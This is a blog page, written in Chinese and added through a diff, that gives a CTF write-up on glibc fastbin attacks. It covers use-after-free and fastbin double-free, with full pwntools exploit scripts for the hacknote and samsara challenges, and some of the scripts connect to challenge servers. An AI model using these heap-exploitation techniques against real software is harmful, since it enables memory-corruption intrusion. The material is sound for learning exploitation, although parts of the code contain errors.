@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+          Rin
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="../../../../style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin%EF%BC%9F"><span class="toc-text">fastbin？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAF"><span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hacknote"><span class="toc-text">hacknote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwnable-hacknote"><span class="toc-text">pwnable_hacknote</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastbinDoubleFree"><span class="toc-text">FastbinDoubleFree</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#metasequoia-2020-samsara"><span class="toc-text">metasequoia_2020_samsara</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="../../../../index.html" class="">
+          Home
+        </a>
+        
+        <a href="../../../../friends" class="">
+          Friends
+        </a>
+        
+        <a href="../../../../about" class="">
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author"></div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author"></div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="../../../../index.html" class="">
+            Home
+          </a>
+          
+          <a href="../../../../friends" class="">
+            Friends
+          </a>
+          
+          <a href="../../../../about" class="">
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title"></div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2021/12/06</span>
+        </span>
+
+        
+
+        
+        
+        
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><hr>
+<p>title： fastbin attack<br>tags： heap_pro</p>
+<hr>
+<h2 id="fastbin？">fastbin？<a class="post-anchor" href="#fastbin？"></a></h2><p>​    </p>
+<h2 id=""><a class="post-anchor" href="#"></a></h2><p>​    长度在<code>32-160</code>(32位系统是<code>16-80</code>)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。</p>
+<h2 id="UAF">UAF<a class="post-anchor" href="#UAF"></a></h2><p>​        先从一个简单的例子开始：</p>
+<h4 id="hacknote">hacknote<a class="post-anchor" href="#hacknote"></a></h4><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">题目链接</a></p>
+<p>​        菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用<code>print_note</code>实则是在调用后门函数。</p>
+<p>​        然后来详细分析一下题目的逻辑。</p>
+<p>​        在<code>add_note()</code>中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：<code>printnote</code>    的指针和<code>content</code>的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。</p>
+<p>​        每个note的chunk的地址是连续的。</p>
+<p>​        我们连续申请两个note。</p>
+<pre><code class="python">addnote(32, "aaaa") # add note 0
+addnote(32, "ddaa") # add note 1
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png" data-caption="截屏2021-12-06 下午10.00.23" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png" alt="截屏2021-12-06 下午10.00.23"></a></p>
+<p>​        可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。</p>
+<p>​        然后我们分别释放这两个chunk。</p>
+<p>（然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬）</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png" data-caption="截屏2021-12-06 下午10.13.27" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png" alt="截屏2021-12-06 下午10.13.27"></a></p>
+<p>​        </p>
+<p>​        问题不大，pwndocker好处就体现在此。</p>
+<p>​        可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png" data-caption="截屏2021-12-06 下午10.15.51" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png" alt="截屏2021-12-06 下午10.15.51"></a></p>
+<p>​        可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png" data-caption="截屏2021-12-06 下午11.10.37" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png" alt="截屏2021-12-06 下午11.10.37"></a></p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png" data-caption="截屏2021-12-06 下午11.12.17" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png" alt="截屏2021-12-06 下午11.12.17"></a></p>
+<p>​            fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是<code>0x5695c038</code>和<code>0x5695c0300</code>。</p>
+<p>​        也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行<code>print(note0)</code>,那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。</p>
+<p>​        此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。</p>
+<p>​        <a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png" data-caption="截屏2021-12-06 下午11.25.50" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png" alt="截屏2021-12-06 下午11.25.50"></a></p>
+<p>完整exp</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+r = process(["/glibc/2.23/32/lib/ld-2.23.so", "./hacknote"], env={"LD_PRELOAD":"/glibc/2.23/32/lib/libc.so.6"})
+
+#context.terminal = ['tmux', 'splitw', '-h']
+##context.update(arch='i386', os='linux')
+#context.log_level = "debug"
+def addnote(size, content):
+    r.recvuntil(":")
+    r.sendline("1")
+    r.recvuntil(":")
+    r.sendline(str(size))
+    r.recvuntil(":")
+    r.sendline(content)
+
+
+def delnote(idx):
+    r.recvuntil(":")
+    r.sendline("2")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+
+def printnote(idx):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+
+#gdb.attach(r)
+magic = 0x08048986
+
+addnote(32, "yuuu") # add note 0
+addnote(32, "ddaa") # add note 1
+
+delnote(0) # delete note 0
+delnote(1) # delete note 1
+addnote(8, p32(0x8048986))
+#gdb.attach(r)
+printnote(0)
+
+
+r.interactive()
+</code></pre>
+<h4 id="pwnable-hacknote">pwnable_hacknote<a class="post-anchor" href="#pwnable-hacknote"></a></h4><p>​        好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。</p>
+<p>​        <a target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#5">题目链接</a></p>
+<p>​        源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+r = process(["/glibc/2.23/32/lib/ld-2.23.so", "./hacknote"], env={"LD_PRELOAD":"/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6"})
+r = remote('chall.pwnable.tw',10102)
+
+libc = ELF("./libc_32.so.6")
+#context.terminal = ['tmux', 'splitw', '-h']
+#context.update(arch='i386', os='linux')
+#context.log_level = "debug"
+
+
+print_addr = 0x804862b
+puts_got = 0x804A024
+
+def addnote(size, content):
+    r.recvuntil(":")
+    r.sendline("1")
+    r.recvuntil(":")
+    r.sendline(str(size))
+    r.recvuntil(":")
+    r.sendline(content)
+
+
+def delnote(idx):
+    r.recvuntil(":")
+    r.sendline("2")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+
+def printnote(idx):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+
+#gdb.attach(r)
+magic = 0x08048986
+
+addnote(32, "yuuu") # add note 0
+addnote(32, "ddaa") # add note 1
+
+delnote(0) # delete note 0
+delnote(1) # delete note 1
+addnote(8,p32(print_addr)+p32(puts_got))
+printnote(0)
+puts_addr = u32(r.recv(4))
+print(hex(puts_addr))
+libc_base = puts_addr - libc.symbols['puts']
+system_addr = libc.symbols['system'] - libc_base
+delnote(2)
+addnote(8,flat([system_addr,"||sh"]))
+#gdb.attach(r)
+printnote(0)
+
+
+r.interactive()
+</code></pre>
+<h2 id="FastbinDoubleFree">FastbinDoubleFree<a class="post-anchor" href="#FastbinDoubleFree"></a></h2><p>​        </p>
+<p>​    关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与<code>main_arena</code>直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。</p>
+<p>​        从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为<code>main_arena</code>（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。</p>
+<p>高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。            </p>
+<p>​        例子来源于之前做过的一些题：</p>
+<h4 id="metasequoia-2020-samsara">metasequoia_2020_samsara<a class="post-anchor" href="#metasequoia-2020-samsara"></a></h4><p>​        <a target="_blank" rel="noopener" href="https://github.com/fuurinko/CTF-TASK/blob/main/metasequoia_2020_samsara">题目链接</a></p>
+<p>​        逻辑比较好逆，如果v8等于deadbeef就能getshell。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png" data-caption="截屏2021-12-07 下午10.28.11" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png" alt="截屏2021-12-07 下午10.28.11"></a></p>
+<p>​        </p>
+<p>​        然后变量的栈布局是这样的</p>
+<p>​    </p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png" data-caption="截屏2021-12-07 下午10.27.32" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png" alt="截屏2021-12-07 下午10.27.32"></a></p>
+<p>​        可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写</p>
+<p>​        然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。</p>
+<p>​        那么思路大概是</p>
+<pre><code>add chunk0
+add chunk1
+add chunk2#防止free chunk被top chunk合并
+
+free chunk0
+free chunk1
+free chunk0
+</code></pre>
+<p>​    此刻fastbin链表大致如下：</p>
+<pre><code>main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0
+</code></pre>
+<p>​    然后此时再</p>
+<pre><code>add chunk3 #申请到的是chunk0的内存空间
+edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）
+然后链表大概长这样：
+main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）
+所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。
+</code></pre>
+<p>​        然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。</p>
+<p>​        （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。）    </p>
+<p>​        （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象）</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+#p = process('./metasequoia_2020_samsara')
+#p = process(["/glibc/2.23/32/lib/ld-2.23.so", "./metasequoia_2020_samsara"], env={"LD_PRELOAD":"/glibc/2.23/32/lib/libc.so.6"})
+p = remote('node4.buuoj.cn',27450)
+#context.terminal = ['tmux', 'splitw', '-h']
+#context.update(arch='i386', os='linux')
+#context.log_level = "debug"
+elf = ELF('./metasequoia_2020_samsara')
+
+def add():
+    p.recvline("choice &gt; ")
+    p.sendline('1')
+
+def dele(idx):
+    p.recvline("choice &gt; ")
+    p.sendline('2')
+    p.sendafter(':',str(idx))
+
+def edit(idx,content):
+    p.recvline("choice &gt; ")
+    p.sendline('3')
+    p.sendafter(':',str(idx))
+    p.sendafter(':',content)
+
+def show():
+    p.recvline("choice &gt; ")
+    p.sendline('4')
+
+def move(dest):
+    p.recvline("choice &gt; ")
+    p.sendline('5')
+    p.sendafter('?',str(dest))
+#double free
+add()#0
+add()#1
+dele(0)
+dele(1)
+dele(0)
+#gdb.attach(p)
+
+add()#2--&gt;0
+add()#3 --&gt;1
+
+move(0x20)
+show()#get the addr of v7
+v7_addr = u64(p.recv(8))
+v8_addr = v7_addr - 8
+edit(2,p64(v8_addr))
+
+edit(3,"0xDEADBEEF")
+p.sendlineafter("choice &gt;",'6')
+
+p.interactive()
+</code></pre>
+<p>​        打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。</p>
+<p>​        在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。</p>
+<p>​        然后是想错了的部分，可以看到我之前的wp中的思路是这样的：</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png" data-caption="截屏2021-12-08 上午10.20.46" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png" alt="截屏2021-12-08 上午10.20.46"></a></p>
+<p>​        错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是</p>
+<p><code>main_arena =&gt; chunk1 =&gt;chunk0(v8)</code>    ，也不知道为什么我会以为新的fd会被重新插入链表。</p>
+<p>​        然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。</p>
+<p>​        所以更正后的exp大概是这样：</p>
+<pre><code class="python">add()#0
+add()#1
+add()#2,防止与top chunk合并
+dele(0)
+dele(1)
+dele(0)
+#gdb.attach(p)
+
+add()#3--&gt;0
+add()#4 --&gt;1
+
+move(0x20)
+show()#get the addr of v7
+v7_addr = u64(p.recv(8))
+v8_addr = v7_addr - 0x8
+edit(3,p64(v8_addr))
+add()#5
+add()#6
+edit(6,0xDEADBEEF)
+</code></pre>
+<h3 id="总结">总结<a class="post-anchor" href="#总结"></a></h3><p>​        感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。</p>
+<p>​        所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="../../08/Untitled/"></a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="../../03/malloc%20lab/">csapp malloc lab</a>
+        
+    </div>
+  </div>
+
+  
+
+
+  <div id="comment"></div>
+
+  
+  <!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/night-owl.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+</article>
+        <footer>
+          <div class="copyright">
+            ©2021
+            <a href="https://fuurinko.github.io">Rin777</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script>  
